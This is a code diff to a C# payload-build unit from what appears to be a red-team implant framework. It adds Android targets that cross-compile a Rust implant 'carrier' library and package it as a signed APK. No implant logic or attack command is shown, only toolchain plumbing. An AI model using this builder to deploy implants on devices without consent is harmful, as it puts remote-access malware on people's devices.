@@ -12,10 +12,11 @@ namespace Rod.BuildPipeline.PayloadBuild;
 /// contract), and compiles a release binary for the requested target
 /// triple. Rust is always native code: the executable formats are synonyms
 /// here (the size posture lives in the crate's release profile -- opt-level,
-/// LTO, strip); the shared-library and shellcode spellings are contract
-/// slots refused until the toolchain that produces them lands. Loader-tier
-/// requests compile the no_std crate beside the implant instead, baked with
-/// fetch constants rather than a contact profile.
+/// LTO, strip); android targets deploy through the carrier library ('so')
+/// or its packaged APK ('apk'), and the remaining shared-library and
+/// shellcode spellings stay contract slots. Loader-tier requests compile
+/// the no_std crate beside the implant instead, baked with fetch constants
+/// rather than a contact profile.
 /// </summary>
 /// <remarks>
 /// The transport and handler trims the .NET unit applies have Rust
@@ -41,9 +42,12 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
     // Every target the contract can map (MapTriple), with the C linker its
     // platform pieces need on the build host: the musl triples get the
     // cross names the build itself sets as CC_*/AR_* (ring's primitives),
-    // the Windows GNU pair the mingw-w64 drivers cargo invokes by default.
-    // A target without its row here still builds; the table exists so the
-    // environment report can name what is missing per target.
+    // the Windows GNU pair the mingw-w64 drivers cargo invokes by default,
+    // and the android pair the NDK clang wrapper named per triple -- which
+    // never sits on PATH, so its readiness resolves through the NDK
+    // (LocateNdk) instead of the PATH scan. A target without its row here
+    // still builds; the table exists so the environment report can name
+    // what is missing per target.
     private static readonly (string Triple, string Os, string Arch, string Linker)[] CrossTargets =
     [
         ("x86_64-unknown-linux-musl", "linux", "amd64", "musl-gcc"),
@@ -52,7 +56,14 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
         ("i686-unknown-linux-musl", "linux", "x86", "musl-gcc"),
         ("x86_64-pc-windows-gnu", "windows", "amd64", "x86_64-w64-mingw32-gcc"),
         ("i686-pc-windows-gnu", "windows", "x86", "i686-w64-mingw32-gcc"),
+        ("aarch64-linux-android", "android", "arm64", "aarch64-linux-android24-clang"),
+        ("x86_64-linux-android", "android", "amd64", "x86_64-linux-android24-clang"),
     ];
+
+    // The bionic floor the carrier leg bakes: API 24 (Android 7.0) covers
+    // the device floor an engagement names, and the NDK clang wrappers
+    // carry it in their names. The carrier manifest's minSdkVersion agrees.
+    private const int AndroidApiLevel = 24;
 
     private readonly string _rustSourceDir;
     private readonly string _cargoBinary;
@@ -136,11 +147,33 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
         foreach (var (triple, os, arch, linker) in CrossTargets)
         {
             var std = installed.Contains(triple);
-            var hasLinker = FindOnPath(linker);
+            // The android linker lives inside the NDK, never on PATH -- the
+            // row's linker name is the wrapper file name, resolved through
+            // the NDK location chain.
+            var hasLinker = triple.EndsWith("-android", StringComparison.Ordinal)
+                ? ResolveNdkClang(triple) is not null
+                : FindOnPath(linker);
             if (!std || !hasLinker)
                 anyTargetMissing = true;
             targets.Add(new BuildTargetReadiness(triple, $"{os}/{arch}", std, hasLinker, linker));
         }
+
+        // The android chain's host pieces beyond rustup: the NDK names the
+        // cross itself, and the apk format rides the SDK's build-tools plus
+        // a JDK (apksigner and keytool are jars; the carrier carries no
+        // Java of its own).
+        var ndk = LocateNdk();
+        findings.Add(ndk is { } ndkRoot
+            ? new("ok", "android ndk", $"NDK {Path.GetFileName(ndkRoot)} at '{ndkRoot}'")
+            : new("missing", "android ndk",
+                "no NDK found -- set ANDROID_NDK_HOME (or ANDROID_NDK_ROOT) to an unpacked NDK, or install one under "
+                + "$ANDROID_HOME/ndk; every android build (formats 'so' and 'apk') fails without it"));
+        var apkChain = LocateBuildTools() is not null && LocatePlatformJar() is not null && LocateJava() is not null;
+        findings.Add(apkChain
+            ? new("ok", "apk packaging", "aapt2/apksigner resolved through ANDROID_HOME build-tools with a JDK on the chain")
+            : new("warn", "apk packaging",
+                "the 'apk' format needs the SDK's build-tools and a platform jar (ANDROID_HOME) plus a JDK for "
+                + "apksigner/keytool (JAVA_HOME or PATH) -- absent those, android builds still deliver the bare 'so'"));
 
         findings.Add(SharedTargetDir is null
             ? new("warn", "build cache",
@@ -245,13 +278,30 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
 
     public async Task<BuildArtifact> BuildAsync(BuildParams @params, CancellationToken cancellationToken = default)
     {
-        if (@params.Format is ArtifactFormat.Dll or ArtifactFormat.SharedObject or ArtifactFormat.Shellcode)
-            throw new InvalidOperationException(
-                $"The '{@params.Format.ToString().ToLowerInvariant()}' format is a contract slot the in-tree Rust unit does not produce yet; build 'exe' or 'aot'.");
         if (!Directory.Exists(_rustSourceDir))
             throw new BuildUnitFailureException($"Rust implant source tree not found at '{_rustSourceDir}'.");
 
         var triple = MapTriple(@params.Target);
+
+        // The format axis over the target: an android target deploys
+        // through the carrier library or its package, and every other
+        // target refuses them -- one shape per deployment story.
+        if (triple.EndsWith("-android", StringComparison.Ordinal))
+        {
+            if (@params.Format is not (ArtifactFormat.SharedObject or ArtifactFormat.Apk))
+                throw new InvalidOperationException(
+                    "An android target deploys through the carrier library or its package; build format 'so' or 'apk'.");
+        }
+        else if (@params.Format is ArtifactFormat.Dll
+            or ArtifactFormat.SharedObject
+            or ArtifactFormat.Shellcode
+            or ArtifactFormat.Apk)
+        {
+            throw new InvalidOperationException(
+                @params.Format == ArtifactFormat.Apk
+                    ? "The 'apk' format is the android carrier package; build an android target for it."
+                    : $"The '{ArtifactFormats.Name(@params.Format)}' format is a contract slot the in-tree Rust unit does not produce on this target; build 'exe' or 'aot'.");
+        }
 
         var workDir = Path.Combine(Path.GetTempPath(), "rod-rust-build-" + Guid.NewGuid().ToString("N"));
         // The staging copy mirrors the crate's real repo layout: build.rs
@@ -297,6 +347,14 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
                     + "pub const PROFILE: &str = \"" + baked + "\";\n",
                 cancellationToken);
 
+            // The android branch: the carrier crate beside the implant (the
+            // loader's sibling) is the cdylib the package's
+            // android.app.NativeActivity loads, and the bake above already
+            // sits in the implant crate's src/baked.rs, read through the
+            // carrier's path dependency.
+            if (triple.EndsWith("-android", StringComparison.Ordinal))
+                return await BuildCarrierAsync(@params, triple, stagingDir, targetDir, cancellationToken);
+
             // A per-build target dir keeps builds hermetic (the shared cargo
             // home and registry cache stay warm across builds).
             var arguments = new List<string> { "build", "--release", "--target", triple };
@@ -315,10 +373,15 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
             // The static (musl) triples: rust ships their std, and the C
             // bits -- ring's primitives -- need a musl cross compiler the
             // build host names per target. A host without the cross fails
-            // inside cargo with the toolchain's own error, loudly.
+            // inside cargo with the toolchain's own error, loudly. The
+            // cc-cased stem keeps the triple's own case (the cc crate
+            // reads CC_x86_64_unknown_linux_musl), and the archiver stays
+            // unset on purpose: the common musl cross shapes ship a gcc
+            // wrapper without a prefixed ar, and the cc crate's own
+            // fallback (plain ar) archives the freestanding objects fine.
             if (triple.EndsWith("-musl", StringComparison.Ordinal))
             {
-                var envStem = triple.Replace('-', '_').ToUpperInvariant();
+                var ccStem = triple.Replace('-', '_');
                 var prefix = triple.Split('-')[0] switch
                 {
                     "x86_64" => "musl-gcc",
@@ -326,8 +389,7 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
                     "armv7" => "armv7-linux-musleabihf-gcc",
                     _ => "musl-gcc",
                 };
-                cargo.Environment[$"CC_{envStem}"] = prefix;
-                cargo.Environment[$"AR_{envStem}"] = prefix.Replace("gcc", "ar");
+                cargo.Environment[$"CC_{ccStem}"] = prefix;
             }
             var result = await RunAsync(cargo, cancellationToken);
             if (result.ExitCode != 0)
@@ -481,6 +543,397 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
             builtAt: DateTimeOffset.UtcNow);
     }
 
+    // The android carrier's build: the cdylib crate beside the implant
+    // (the same shape the loader tier uses -- an external crate the unit
+    // compiles per request), cross-compiled through the NDK's clang
+    // wrapper, which serves as the C compiler (ring's primitives), the
+    // archiver, and the final library link in one toolchain. The artifact
+    // is the bare library for 'so', or the packaged APK for 'apk' -- the
+    // package's face is the carrier crate's own checked-in
+    // AndroidManifest.xml.
+    private async Task<BuildArtifact> BuildCarrierAsync(
+        BuildParams @params,
+        string triple,
+        string stagingDir,
+        string targetDir,
+        CancellationToken cancellationToken)
+    {
+        var carrierDir = Path.Combine(stagingDir, "carrier");
+        if (!Directory.Exists(carrierDir))
+            throw new BuildUnitFailureException(
+                $"The carrier crate was not found beside the implant at '{carrierDir}'.");
+        var clang = ResolveNdkClang(triple)
+            ?? throw new BuildUnitFailureException(
+                "The android cross needs the NDK -- set ANDROID_NDK_HOME (or ANDROID_NDK_ROOT) to an unpacked NDK, "
+                + "or install one under $ANDROID_HOME/ndk; the environment report names the gap.");
+
+        var cargo = new ProcessStartInfo
+        {
+            FileName = _cargoBinary,
+            WorkingDirectory = carrierDir,
+            UseShellExecute = false,
+            RedirectStandardError = true,
+            RedirectStandardOutput = true,
+        };
+        foreach (var argument in new[] { "build", "--release", "--target", triple })
+            cargo.ArgumentList.Add(argument);
+        cargo.Environment["CARGO_TARGET_DIR"] = targetDir;
+        cargo.Environment["CARGO_NET_GIT_FETCH_WITH_CLI"] = "true";
+        // The NDK toolchain: one clang wrapper serves ring's C, the
+        // archive step, and the cdylib link -- the same CC_*/AR_* dance
+        // the musl crosses do, plus cargo's own linker override for the
+        // final library. The cc-cased stems keep the triple's own case
+        // (CC_x86_64_linux_android); only cargo's LINKER key uppercases.
+        var ccStem = triple.Replace('-', '_');
+        var envStem = ccStem.ToUpperInvariant();
+        cargo.Environment[$"CC_{ccStem}"] = clang;
+        cargo.Environment[$"AR_{ccStem}"] = NdkSibling(clang, "llvm-ar");
+        cargo.Environment[$"CARGO_TARGET_{envStem}_LINKER"] = clang;
+        var result = await RunAsync(cargo, cancellationToken);
+        if (result.ExitCode != 0)
+        {
+            var diag = result.Stdout;
+            if (result.Stderr.Length > 0)
+                diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
+            throw new BuildUnitFailureException(
+                $"cargo build failed for the carrier (exit {result.ExitCode}):\n{diag}");
+        }
+
+        var soPath = Path.Combine(targetDir, triple, "release", "librod_carrier.so");
+        if (!File.Exists(soPath))
+            throw new BuildUnitFailureException(
+                $"cargo reported success but produced no librod_carrier.so for {triple}.");
+
+        if (@params.Format == ArtifactFormat.SharedObject)
+        {
+            var so = await File.ReadAllBytesAsync(soPath, cancellationToken);
+            return BuildArtifact.Of(
+                Language,
+                Guid.NewGuid(),
+                @params,
+                so,
+                contentType: "application/octet-stream",
+                builtAt: DateTimeOffset.UtcNow);
+        }
+        return await PackageApkAsync(@params, triple, soPath, carrierDir, cancellationToken);
+    }
+
+    // Assembles the installable package from the carrier: aapt2 links the
+    // crate's manifest against the SDK's platform jar (the package carries
+    // no dex -- hasCode=false, the framework's own NativeActivity is the
+    // whole app), the cdylib rides in at lib/<abi>/ stored uncompressed
+    // (extractNativeLibs=false: the loader maps it straight out of the
+    // package), zipalign fixes the boundaries including the .so's page
+    // alignment, and apksigner signs. The signing key is the ecosystem's
+    // debug keystore convention (~/.android/debug.keystore, generated on
+    // first use): the lab shape an engagement replaces with its own key
+    // for a deliverable that must survive reinstalls (the runbook owns
+    // that step).
+    private async Task<BuildArtifact> PackageApkAsync(
+        BuildParams @params,
+        string triple,
+        string soPath,
+        string carrierDir,
+        CancellationToken cancellationToken)
+    {
+        var buildTools = LocateBuildTools()
+            ?? throw new BuildUnitFailureException(
+                "The 'apk' format needs the SDK's build-tools (aapt2/zipalign/apksigner) -- set ANDROID_HOME to the SDK root.");
+        var platformJar = LocatePlatformJar()
+            ?? throw new BuildUnitFailureException(
+                "The 'apk' format needs an installed platform (ANDROID_HOME/platforms/android-*/android.jar) for the manifest link.");
+        var java = LocateJava()
+            ?? throw new BuildUnitFailureException(
+                "The 'apk' format needs a JDK for apksigner and keytool -- set JAVA_HOME or put java on PATH.");
+        var javaHome = JavaHome(java)
+            ?? throw new BuildUnitFailureException(
+                "The 'apk' format needs JAVA_HOME (or a resolvable java) for the jar-launching packaging scripts.");
+
+        var work = Path.Combine(Path.GetTempPath(), "rod-apk-" + Guid.NewGuid().ToString("N"));
+        Directory.CreateDirectory(work);
+        try
+        {
+            var baseApk = Path.Combine(work, "base.apk");
+            var aligned = Path.Combine(work, "aligned.apk");
+            var signed = Path.Combine(work, "signed.apk");
+
+            var link = Step(Path.Combine(buildTools, "aapt2"), work);
+            link.ArgumentList.Add("link");
+            link.ArgumentList.Add("--manifest");
+            link.ArgumentList.Add(Path.Combine(carrierDir, "AndroidManifest.xml"));
+            link.ArgumentList.Add("-I");
+            link.ArgumentList.Add(platformJar);
+            link.ArgumentList.Add("-o");
+            link.ArgumentList.Add(baseApk);
+            await RunStepAsync(link, "aapt2 link", cancellationToken);
+
+            // The library rides at lib/<abi>/librod_carrier.so -- the path
+            // the package manager maps into the app's linker namespace,
+            // named by android ABI, not by triple. Stored, not deflated:
+            // an uncompressed page-aligned .so is what extractNativeLibs=
+            // false loads directly.
+            var abi = triple.StartsWith("aarch64-", StringComparison.Ordinal) ? "arm64-v8a" : "x86_64";
+            using (var archive = System.IO.Compression.ZipFile.Open(baseApk, System.IO.Compression.ZipArchiveMode.Update))
+            {
+                var entry = archive.CreateEntry($"lib/{abi}/librod_carrier.so", System.IO.Compression.CompressionLevel.NoCompression);
+                await using (var target = entry.Open())
+                await using (var source = File.OpenRead(soPath))
+                    await source.CopyToAsync(target, cancellationToken);
+            }
+
+            var align = Step(Path.Combine(buildTools, "zipalign"), work);
+            align.ArgumentList.Add("-f");
+            align.ArgumentList.Add("-p");
+            align.ArgumentList.Add("4");
+            align.ArgumentList.Add(baseApk);
+            align.ArgumentList.Add(aligned);
+            await RunStepAsync(align, "zipalign", cancellationToken);
+
+            var keystore = await EnsureDebugKeystoreAsync(javaHome, cancellationToken);
+            var sign = Step(Path.Combine(buildTools, "apksigner"), work);
+            sign.Environment["JAVA_HOME"] = javaHome;
+            // The apksigner launcher execs bare `java`, PATH-resolved: the
+            // JDK the chain resolved rides in front so the script cannot
+            // pick a different one (or none).
+            sign.Environment["PATH"] =
+                Path.Combine(javaHome, "bin") + Path.PathSeparator
+                + (Environment.GetEnvironmentVariable("PATH") ?? "");
+            sign.ArgumentList.Add("sign");
+            sign.ArgumentList.Add("--ks");
+            sign.ArgumentList.Add(keystore);
+            sign.ArgumentList.Add("--ks-pass");
+            sign.ArgumentList.Add("pass:android");
+            sign.ArgumentList.Add("--ks-key-alias");
+            sign.ArgumentList.Add("androiddebugkey");
+            sign.ArgumentList.Add("--key-pass");
+            sign.ArgumentList.Add("pass:android");
+            sign.ArgumentList.Add("--out");
+            sign.ArgumentList.Add(signed);
+            sign.ArgumentList.Add(aligned);
+            await RunStepAsync(sign, "apksigner sign", cancellationToken);
+
+            var apk = await File.ReadAllBytesAsync(signed, cancellationToken);
+            return BuildArtifact.Of(
+                Language,
+                Guid.NewGuid(),
+                @params,
+                apk,
+                contentType: "application/vnd.android.package-archive",
+                builtAt: DateTimeOffset.UtcNow);
+        }
+        finally
+        {
+            try { Directory.Delete(work, recursive: true); }
+            catch { /* best-effort; temp dir is disposable */ }
+        }
+    }
+
+    // The debug keystore convention: generated once under ~/.android and
+    // reused, so lab builds install over each other. keytool comes from
+    // the same JDK the packaging chain rides.
+    private static async Task<string> EnsureDebugKeystoreAsync(string javaHome, CancellationToken cancellationToken)
+    {
+        var profileRoot = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        if (string.IsNullOrEmpty(profileRoot))
+            throw new BuildUnitFailureException("No user profile directory for the debug keystore.");
+        var keystore = Path.Combine(profileRoot, ".android", "debug.keystore");
+        var keystoreDir = Path.GetDirectoryName(keystore)!;
+        if (File.Exists(keystore))
+            return keystore;
+        Directory.CreateDirectory(keystoreDir);
+
+        var keytool = Path.Combine(javaHome, "bin", "keytool");
+        var generate = Step(File.Exists(keytool) ? keytool : "keytool", keystoreDir);
+        foreach (var argument in new[]
+        {
+            "-genkeypair",
+            "-keystore", keystore,
+            "-storepass", "android",
+            "-keypass", "android",
+            "-alias", "androiddebugkey",
+            "-dname", "CN=Android Debug,O=Android,C=US",
+            "-keyalg", "RSA",
+            "-keysize", "2048",
+            "-validity", "10000",
+        })
+            generate.ArgumentList.Add(argument);
+        var result = await RunAsync(generate, cancellationToken);
+        if (result.ExitCode != 0)
+            throw new BuildUnitFailureException(
+                $"keytool could not generate the debug keystore (exit {result.ExitCode}):\n{result.Stderr}");
+        return keystore;
+    }
+
+    private static ProcessStartInfo Step(string binary, string workingDirectory)
+        => new()
+        {
+            FileName = binary,
+            WorkingDirectory = workingDirectory,
+            UseShellExecute = false,
+            RedirectStandardError = true,
+            RedirectStandardOutput = true,
+        };
+
+    private static async Task RunStepAsync(ProcessStartInfo start, string name, CancellationToken cancellationToken)
+    {
+        var result = await RunAsync(start, cancellationToken);
+        if (result.ExitCode != 0)
+        {
+            var diag = result.Stdout;
+            if (result.Stderr.Length > 0)
+                diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
+            throw new BuildUnitFailureException($"{name} failed (exit {result.ExitCode}):\n{diag}");
+        }
+    }
+
+    // --- The android host chain: the NDK cross and the SDK packaging ---
+
+    // The NDK root: an explicit variable names an unpacked NDK directly
+    // (ANDROID_NDK_HOME, then ANDROID_NDK_ROOT); otherwise the SDK's own
+    // ndk/<version> slot with the highest version. Null when the host
+    // carries neither -- the first refusal every android build names.
+    public static string? LocateNdk()
+    {
+        foreach (var variable in new[] { "ANDROID_NDK_HOME", "ANDROID_NDK_ROOT" })
+        {
+            var named = NonEmptyOrNull(Environment.GetEnvironmentVariable(variable));
+            if (named is not null && File.Exists(Path.Combine(named, "source.properties")))
+                return named;
+        }
+        var sdk = LocateAndroidSdk();
+        if (sdk is null)
+            return null;
+        var ndkRoot = Path.Combine(sdk, "ndk");
+        if (!Directory.Exists(ndkRoot))
+            return null;
+        return Directory.EnumerateDirectories(ndkRoot)
+            .Where(d => File.Exists(Path.Combine(d, "source.properties")))
+            .Select(d => (Dir: d, Version: Version.TryParse(Path.GetFileName(d), out var v) ? v : null))
+            .Where(t => t.Version is not null)
+            .OrderByDescending(t => t.Version)
+            .Select(t => t.Dir)
+            .FirstOrDefault();
+    }
+
+    // The SDK root (ANDROID_HOME, then ANDROID_SDK_ROOT): the packaging
+    // chain's shared home.
+    public static string? LocateAndroidSdk()
+    {
+        foreach (var variable in new[] { "ANDROID_HOME", "ANDROID_SDK_ROOT" })
+        {
+            var named = NonEmptyOrNull(Environment.GetEnvironmentVariable(variable));
+            if (named is not null && Directory.Exists(named))
+                return named;
+        }
+        return null;
+    }
+
+    // The NDK's llvm toolchain bin for this build host: prebuilt/ carries
+    // one directory per supported host; a Linux host takes the linux one
+    // whatever its arch suffix.
+    private static string? NdkToolchainBin(string ndkRoot)
+    {
+        var prebuilt = Path.Combine(ndkRoot, "toolchains", "llvm", "prebuilt");
+        if (!Directory.Exists(prebuilt))
+            return null;
+        var host = Directory.EnumerateDirectories(prebuilt)
+            .FirstOrDefault(d => Path.GetFileName(d).StartsWith("linux", StringComparison.Ordinal));
+        return host is null ? null : Path.Combine(host, "bin");
+    }
+
+    // The per-target clang wrapper with the bionic floor baked into its
+    // name -- the one tool the android cross needs. Current NDKs ship the
+    // bare name; older ones the .sh spelling; either answers.
+    public static string? ResolveNdkClang(string triple)
+    {
+        var ndk = LocateNdk();
+        if (ndk is null)
+            return null;
+        var bin = NdkToolchainBin(ndk);
+        if (bin is null)
+            return null;
+        var name = $"{triple}{AndroidApiLevel}-clang";
+        foreach (var candidate in new[] { name, name + ".sh" })
+        {
+            var path = Path.Combine(bin, candidate);
+            if (File.Exists(path))
+                return path;
+        }
+        return null;
+    }
+
+    // A tool beside the resolved clang (llvm-ar, say): the same bin dir.
+    private static string NdkSibling(string tool, string name)
+        => Path.Combine(Path.GetDirectoryName(tool)!, name);
+
+    // The newest build-tools dir carrying the packaging trio.
+    public static string? LocateBuildTools()
+    {
+        var root = SdkDir("build-tools");
+        if (root is null)
+            return null;
+        return Directory.EnumerateDirectories(root)
+            .Where(d => File.Exists(Path.Combine(d, "aapt2"))
+                && File.Exists(Path.Combine(d, "zipalign"))
+                && File.Exists(Path.Combine(d, "apksigner")))
+            .OrderByDescending(d => Version.TryParse(Path.GetFileName(d), out var v) ? v : new Version(0, 0))
+            .FirstOrDefault();
+    }
+
+    // The newest installed platform's android.jar -- the compilation
+    // target of the manifest link.
+    public static string? LocatePlatformJar()
+    {
+        var root = SdkDir("platforms");
+        if (root is null)
+            return null;
+        return Directory.EnumerateDirectories(root)
+            .Where(d => File.Exists(Path.Combine(d, "android.jar")))
+            .OrderByDescending(d => Version.TryParse(
+                Path.GetFileName(d).Replace("android-", "", StringComparison.Ordinal), out var v) ? v : new Version(0, 0))
+            .Select(d => Path.Combine(d, "android.jar"))
+            .FirstOrDefault();
+    }
+
+    // A usable java binary: JAVA_HOME's own first, else PATH -- apksigner
+    // and keytool ride it.
+    public static string? LocateJava()
+    {
+        var home = NonEmptyOrNull(Environment.GetEnvironmentVariable("JAVA_HOME"));
+        if (home is not null && File.Exists(Path.Combine(home, "bin", "java")))
+            return Path.Combine(home, "bin", "java");
+        return FindOnPath("java") ? "java" : null;
+    }
+
+    // JAVA_HOME for the jar-launching packaging scripts: the variable when
+    // set, else derived from a resolved java binary.
+    private static string? JavaHome(string java)
+    {
+        var declared = NonEmptyOrNull(Environment.GetEnvironmentVariable("JAVA_HOME"));
+        if (declared is not null)
+            return declared;
+        try
+        {
+            var derived = Path.GetDirectoryName(Path.GetDirectoryName(Path.GetFullPath(java)));
+            return derived is not null && File.Exists(Path.Combine(derived, "bin", "java"))
+                ? derived
+                : null;
+        }
+        catch
+        {
+            return null;
+        }
+    }
+
+    private static string? SdkDir(string name)
+    {
+        var sdk = LocateAndroidSdk();
+        if (sdk is null)
+            return null;
+        var root = Path.Combine(sdk, name);
+        return Directory.Exists(root) ? root : null;
+    }
+
     // Whether a cross target is actually buildable on this host: the
     // target's std under rustc's sysroot and its C linker on PATH. Tests
     // that drive real cross builds gate on this rather than the whole-
@@ -496,6 +949,10 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
         if (!Directory.Exists(stdRoot)
             || !Directory.Exists(Path.Combine(stdRoot, triple)))
             return false;
+        // The android linker resolves through the NDK rather than PATH --
+        // the same split the environment report's readiness rows follow.
+        if (triple.EndsWith("-android", StringComparison.Ordinal))
+            return ResolveNdkClang(triple) is not null;
         var linker = CrossTargets.FirstOrDefault(t => t.Triple == triple).Linker;
         return linker is not null && FindOnPath(linker);
     }
@@ -567,11 +1024,13 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
     // Maps the contract's os/arch pairs onto Rust target triples. Linux is
     // musl everywhere -- the static, runtime-free deployment shape that is
     // the reach implant's whole point (routers, appliances, IoT); measured
-    // x86_64: 2.25 MB fully static. Apple targets need the Apple SDK a
-    // Linux build host does not carry, and ARM Windows has no GNU target, so
-    // both refuse with the supported set named rather than failing inside
-    // cargo with a less fixable error. The ARM musl triples map too; they
-    // build once the host carries their cross toolchains.
+    // x86_64: 2.25 MB fully static. Android maps onto the carrier legs:
+    // arm64 for devices, amd64 for the emulator the lab proves them on
+    // (architecture.md Sec 12.2), the NDK's bionic floor baked into the
+    // triple's clang wrapper name. Apple targets need the Apple SDK a
+    // Linux build host does not carry, and ARM Windows has no GNU target,
+    // so both refuse with the supported set named rather than failing
+    // inside cargo with a less fixable error.
     public static string MapTriple(TargetProfile target)
     {
         var os = target.OperatingSystem.Trim().ToLowerInvariant();
@@ -584,13 +1043,15 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
             ("linux", "x86" or "386") => "i686-unknown-linux-musl",
             ("windows" or "win", "amd64" or "x64" or "x86_64") => "x86_64-pc-windows-gnu",
             ("windows" or "win", "x86" or "386") => "i686-pc-windows-gnu",
+            ("android", "arm64" or "aarch64") => "aarch64-linux-android",
+            ("android", "amd64" or "x64" or "x86_64") => "x86_64-linux-android",
             ("osx" or "darwin" or "macos", _) => throw new InvalidOperationException(
                 "The Rust build unit does not cross Apple targets (the link needs the Apple SDK); build on a macOS host."),
             ("windows" or "win", "arm64" or "aarch64") => throw new InvalidOperationException(
                 "The Rust build unit has no GNU target for ARM Windows."),
             _ => throw new InvalidOperationException(
                 $"Unsupported target '{target.OperatingSystem}/{target.Architecture}' for the Rust build unit " +
-                "(supported: linux amd64/arm64/arm/x86, windows amd64/x86)."),
+                "(supported: linux amd64/arm64/arm/x86, windows amd64/x86, android arm64/amd64)."),
         };
     }
 
